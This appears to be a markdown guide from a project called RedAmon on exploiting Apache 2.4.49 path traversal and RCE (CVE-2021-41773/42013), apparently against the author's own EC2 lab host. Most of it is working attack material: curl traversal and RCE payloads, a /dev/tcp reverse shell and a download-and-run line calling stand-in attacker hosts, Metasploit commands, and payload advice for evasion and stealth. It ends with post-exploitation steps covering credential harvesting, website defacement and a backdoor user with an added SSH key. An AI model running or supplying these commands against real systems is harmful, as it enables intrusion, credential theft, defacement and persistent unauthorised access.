
## Metasploit (via RedAmon Kali Container)

### CVE-2021-41773 / CVE-2021-42013 (Path Traversal + RCE)

Both vulnerabilities affect **Apache 2.4.49** and exploit path traversal, but they differ in encoding technique and impact.

---

#### CVE-2021-41773 (October 4, 2021)

**The original vulnerability**

| Aspect | Details |
|--------|---------|
| **Encoding** | Single URL encoding: `%2e` → `.` |
| **Payload** | `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` |
| **Impact** | **File read only** (path traversal) |
| **CVSS** | 7.5 (High) |
| **Requirement** | `Require all granted` on directories outside docroot |

**How it works:**
1. Apache's path normalization failed to decode `%2e` (URL-encoded `.`) before checking for `../`
2. Attacker sends `/.%2e/` which bypasses the directory traversal filter
3. Apache decodes it to `/../` *after* the security check
4. Result: Read arbitrary files on the filesystem

**Example exploit:**
```bash
curl "http://target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

---

#### CVE-2021-42013 (October 7, 2021)

**The bypass for the incomplete fix**

| Aspect | Details |
|--------|---------|
| **Encoding** | Double URL encoding: `%%32%65` → `%2e` → `.` |
| **Payload** | `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` |
| **Impact** | **File read + RCE** (Remote Code Execution) |
| **CVSS** | 9.8 (Critical) |
| **Requirement** | Same + `mod_cgi` enabled for RCE |

**How it works:**
1. Apache patched CVE-2021-41773 by detecting `%2e`
2. But the fix didn't account for **double encoding**
3. `%%32%65` decodes in two steps:
   - First pass: `%%32%65` → `%2e` (decodes `%32` to `2`, `%65` to `e`)
   - Second pass: `%2e` → `.`
4. The security check happens between the two decoding passes, so it's bypassed

**Example exploits:**
```bash
# File read
curl "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

# RCE (requires mod_cgi)
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"
```

---

#### Key Differences Summary

| Feature | CVE-2021-41773 | CVE-2021-42013 |
|---------|----------------|----------------|
| **Encoding** | Single (`%2e`) | Double (`%%32%65`) |
| **Discovered** | Oct 4, 2021 | Oct 7, 2021 (3 days later) |
| **File Read** | Yes | Yes |
| **RCE** | No | **Yes** (with mod_cgi) |
| **CVSS** | 7.5 (High) | 9.8 (Critical) |
| **Patched in** | 2.4.50 (incomplete) | 2.4.51 |

---

#### From Path Traversal to RCE: How It Works

Path traversal alone only allows **reading files**. But when combined with Apache's CGI functionality, it becomes **Remote Code Execution (RCE)**.

---

##### Step 1: Path Traversal = File Read

The basic path traversal allows you to escape the web root and read any file:

```
Normal request:     GET /index.html           → /var/www/html/index.html
Path traversal:     GET /cgi-bin/../../../etc/passwd → /etc/passwd
```

**What you can do with file read:**
- Read `/etc/passwd` - list system users
- Read `/etc/shadow` - password hashes (if readable)
- Read config files - database credentials, API keys
- Read SSH keys - `/root/.ssh/id_rsa`
- Read source code - application secrets

---

##### Step 2: Path Traversal + CGI = RCE

The magic happens when you traverse to an **executable** through a CGI-enabled path:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  REQUEST                                                                    │
│  POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh                  │
│  Body: echo Content-Type: text/plain; echo; whoami                         │
├─────────────────────────────────────────────────────────────────────────────┤
│  WHAT HAPPENS                                                               │
│                                                                             │
│  1. Apache receives request to /cgi-bin/...                                │
│  2. Path traversal bypasses security → resolves to /bin/sh                 │
│  3. Apache sees /cgi-bin/ prefix → treats it as CGI script                 │
│  4. Apache EXECUTES /bin/sh as a CGI program                               │
│  5. POST body is piped to /bin/sh as stdin                                 │
│  6. Shell executes: echo Content-Type: text/plain; echo; whoami            │
│  7. Output returned as HTTP response                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│  RESPONSE                                                                   │
│  HTTP/1.1 200 OK                                                           │
│  Content-Type: text/plain                                                  │
│                                                                             │
│  root                                                                       │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

##### Why `/bin/sh` Works as CGI

CGI (Common Gateway Interface) is a protocol where:
1. Apache executes a program
2. HTTP request body → program's **stdin**
3. Program's **stdout** → HTTP response body

When you traverse to `/bin/sh`:
- Apache executes the shell
- Your POST data becomes shell commands
- Command output becomes the HTTP response

**The CGI header trick:**
```bash
echo Content-Type: text/plain; echo; id
#     ↑ CGI header required        ↑ blank line separates header from body
```

Without the `Content-Type` header, Apache returns 500 Internal Server Error.

---

##### Required Apache Configuration

For RCE to work, the server must have:

```apache
# 1. CGI module loaded
LoadModule cgi_module modules/mod_cgi.so

# 2. CGI execution enabled for /bin
<Directory "/bin">
    Options +ExecCGI
    SetHandler cgi-script
    Require all granted
</Directory>

# 3. Access granted to filesystem root
<Directory />
    Require all granted
</Directory>
```

---

##### Attack Flow Diagram

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Attacker   │────▶│    Apache    │────▶│   /bin/sh    │────▶│   System     │
│              │     │   (mod_cgi)  │     │  (executed)  │     │  (compromised)│
└──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘
       │                    │                    │                    │
       │ POST request       │ Path traversal     │ Commands from      │ Full shell
       │ with commands      │ bypasses filter    │ POST body          │ access
       └────────────────────┴────────────────────┴────────────────────┘
```

---

##### Practical Examples

**Execute single command:**
```bash
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"
# Returns: uid=0(root) gid=0(root) groups=0(root)
```

**Read sensitive file:**
```bash
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; cat /etc/shadow"
```

**Reverse shell:**
```bash
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

**Download and execute payload:**
```bash
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; curl http://attacker/payload.sh | bash"
```

---

#### Exploitation Types

**1. Path Traversal (File Read)**
- Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files
- Gather credentials, SSH keys, API tokens
- Map the system structure

**2. Remote Code Execution (CVE-2021-42013 only)**
- Requires `mod_cgi` or `mod_cgid` enabled
- Traverse to `/bin/sh` and execute it as CGI
- Full shell access as the Apache user (often `www-data` or `root`)

**3. Post-Exploitation possibilities:**
- System reconnaissance
- Credential harvesting
- Lateral movement
- Persistence (backdoor users, SSH keys)
- Website defacement
- Pivot to internal network

---

#### Metasploit Exploitation

```bash
# Enter Kali container with Metasploit
docker exec -it redamon-kali msfconsole

# Search for the module
msf6 > search CVE-2021-42013

# Use the exploit (direct to EC2, bypass ALB)
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 15.160.68.117
msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 8080
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell/bind_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > set LPORT 4444
msf6 exploit(multi/http/apache_normalize_path_rce) > exploit
```

> **Note**: Uses bind shell (EC2 listens, you connect). Requires port 4444 open in EC2 Security Group.

---

#### Understanding Metasploit Payloads

Use `show payloads` to list all compatible payloads for the exploit. Here's what the most important ones do:

##### Payload Categories

**Shell vs Meterpreter:**

| Type | Description | Use Case |
|------|-------------|----------|
| **shell** | Basic command shell (like SSH) | Simple, lightweight, less detectable |
| **meterpreter** | Advanced Metasploit shell | File upload/download, screenshot, keylogger, persistence |

**Bind vs Reverse:**

| Type | Direction | When to Use |
|------|-----------|-------------|
| **bind_tcp** | Target opens port → You connect TO target | You're behind NAT/firewall (home network) |
| **reverse_tcp** | Target connects → Back to YOU | Target is behind firewall, you have public IP |

```
BIND:     [Attacker] ────connect────▶ [Target:4444]
REVERSE:  [Attacker:4444] ◀────connect──── [Target]
```

**Staged vs Inline:**

| Type | Syntax | Size | How it works |
|------|--------|------|--------------|
| **Staged** | `shell/bind_tcp` | Small | Stage 1 downloads Stage 2 from Metasploit |
| **Inline** | `shell_bind_tcp` | Larger | Full payload in single shot |

> **Rule:** Use staged (`shell/`) when possible - smaller and more reliable.

---

##### Top 10 Most Useful Payloads

| # | Payload | Description | When to Use |
|---|---------|-------------|-------------|
| **16** | `linux/x64/shell/bind_tcp` | Basic shell, target listens | **Home network** (behind NAT) |
| **18** | `linux/x64/shell/reverse_tcp` | Basic shell, target connects back | **Cloud/VPS** (you have public IP) |
| **8** | `linux/x64/meterpreter/bind_tcp` | Advanced shell, target listens | Need file transfer, persistence |
| **10** | `linux/x64/meterpreter/reverse_tcp` | Advanced shell, target connects back | **Most powerful** - all features |
| **11** | `linux/x64/meterpreter_reverse_http` | Meterpreter over HTTP | **Firewall evasion** (port 80) |
| **12** | `linux/x64/meterpreter_reverse_https` | Meterpreter over HTTPS | **Stealth** - encrypted, looks normal |
| **7** | `linux/x64/exec` | Run single command | Quick command, no shell needed |
| **20** | `linux/x64/shell_bind_tcp` | Inline bind shell | No staging, single packet |
| **3** | `generic/shell_bind_tcp` | Universal bind shell | Works on any platform |
| **2** | `generic/shell_bind_aws_ssm` | AWS SSM connection | AWS-specific, uses SSM API |

---

##### Quick Decision Guide

```
Are you behind NAT/router at home?
├── YES → Use bind_tcp (target listens)
│         └── linux/x64/shell/bind_tcp
│         └── linux/x64/meterpreter/bind_tcp
│
└── NO (you have public IP or cloud VM)
    └── Use reverse_tcp (target connects to you)
        └── linux/x64/shell/reverse_tcp
        └── linux/x64/meterpreter/reverse_tcp

Need advanced features (file transfer, persistence)?
├── YES → Use meterpreter
└── NO → Use shell (lighter, stealthier)

Firewall blocking unusual ports?
└── YES → Use HTTP/HTTPS payloads
    └── linux/x64/meterpreter_reverse_http   (port 80)
    └── linux/x64/meterpreter_reverse_https  (port 443)
```

---

##### x64 vs x86

| Architecture | When to Use |
|--------------|-------------|
| **x64** | Modern 64-bit Linux (most servers today) |
| **x86** | Older 32-bit systems, or when x64 fails |

> **Tip:** Always try x64 first. If it fails, fallback to x86.

---

##### Why We Use `linux/x64/shell/bind_tcp`

In this setup:
1. **You're at home** behind a router/NAT
2. **EC2 is in the cloud** with a public IP
3. Your router blocks incoming connections (reverse shell fails)
4. With bind shell: EC2 opens port 4444, you connect TO it

```
[Your Home PC] ──────connect──────▶ [EC2:4444]
     (NAT)                           (public IP)
```

**Requirements for bind shell:**
- Port 4444 open in EC2 Security Group
- Port 4444 mapped in docker-compose.yml (`- "4444:4444"`)

---

##### Default Payload Behavior

If you don't set a payload, Metasploit uses a default (usually `cmd/unix/reverse_bash`):

```bash
# Without setting payload
msf6 > exploit
[-] Exploit failed: The target couldn't connect back to you
```

The default reverse shell tries to connect to your machine, but your router blocks it. **Always set the payload explicitly.**

### Post-Exploitation

Once you have a shell session, interact with it:

```bash
msf6 > sessions -i 1
```

#### System Reconnaissance

```bash
# Who am I?
whoami
id

# System info
uname -a
cat /etc/os-release

# Network info
hostname
cat /etc/hosts
ip addr

# Running processes
ps aux

# Environment variables
env
```

#### Credential Harvesting

```bash
# Read passwd file
cat /etc/passwd

# Read shadow file (if readable)
cat /etc/shadow

# Find config files with passwords
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.env" 2>/dev/null

# Apache config
cat /usr/local/apache2/conf/httpd.conf

# Check for SSH keys
ls -la /root/.ssh/
cat /root/.ssh/id_rsa 2>/dev/null
```

#### Website Defacement

```bash
# Deface the website
echo '<html><body style="background:#000;color:#0f0;text-align:center;padding-top:200px;"><h1>YOU ARE HACKED!</h1><p>CVE-2021-42013 - Apache 2.4.49 RCE</p></body></html>' > /usr/local/apache2/htdocs/index.html

# Verify
cat /usr/local/apache2/htdocs/index.html
```

#### Persistence (Optional)

```bash
# Create backdoor user
useradd -m -s /bin/bash hacker
echo "hacker:hacked123" | chpasswd

# Add SSH key (if SSH available)
mkdir -p /root/.ssh
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
```

#### Exit Session

```bash
# Background the session
background
# or Ctrl+Z

# Kill the session
sessions -k 1
```

---